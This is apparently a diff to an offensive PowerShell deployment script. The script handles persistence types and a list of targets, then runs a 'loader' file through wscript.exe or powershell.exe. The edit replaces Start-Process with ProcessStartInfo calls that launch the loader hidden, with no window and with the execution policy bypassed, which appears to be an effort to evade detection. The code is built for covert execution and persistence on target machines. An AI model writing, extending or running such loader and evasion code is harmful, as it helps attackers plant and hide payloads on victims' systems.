@@ -481,9 +481,19 @@ foreach(`$pType in @('$persistArray')) {
 # Execute if requested
 if(-not `$NoExec) { 
     if(`$loaderPath.EndsWith('.vbs')) { 
-        Start-Process wscript.exe -ArgumentList @('//B', `$loaderPath) -WindowStyle Hidden -NoNewWindow
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = "wscript.exe"
+        $psi.Arguments = "//B `"$loaderPath`""
+        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        $psi.CreateNoWindow = $true
+        [System.Diagnostics.Process]::Start($psi) | Out-Null
     } else { 
-        Start-Process powershell.exe -ArgumentList @('-WindowStyle', 'Hidden', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', `$loaderPath) -WindowStyle Hidden -NoNewWindow
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = "powershell.exe"
+        $psi.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$loaderPath`""
+        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        $psi.CreateNoWindow = $true
+        [System.Diagnostics.Process]::Start($psi) | Out-Null
     }
 }
 
@@ -515,9 +525,19 @@ foreach($target in $Targets) {
         
         if(!$NoExec) { 
             if($loaderPath.EndsWith('.vbs')) { 
-                Start-Process wscript.exe -ArgumentList @('//B', $loaderPath) -WindowStyle Hidden -NoNewWindow
+                $psi = New-Object System.Diagnostics.ProcessStartInfo
+                $psi.FileName = "wscript.exe"
+                $psi.Arguments = "//B `"$loaderPath`""
+                $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+                $psi.CreateNoWindow = $true
+                [System.Diagnostics.Process]::Start($psi) | Out-Null
             } else { 
-                Start-Process powershell.exe -ArgumentList @('-WindowStyle', 'Hidden', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $loaderPath) -WindowStyle Hidden -NoNewWindow
+                $psi = New-Object System.Diagnostics.ProcessStartInfo
+                $psi.FileName = "powershell.exe"
+                $psi.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$loaderPath`""
+                $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+                $psi.CreateNoWindow = $true
+                [System.Diagnostics.Process]::Start($psi) | Out-Null
             }
         }
         Write-Host "Local deployment complete" -ForegroundColor Green
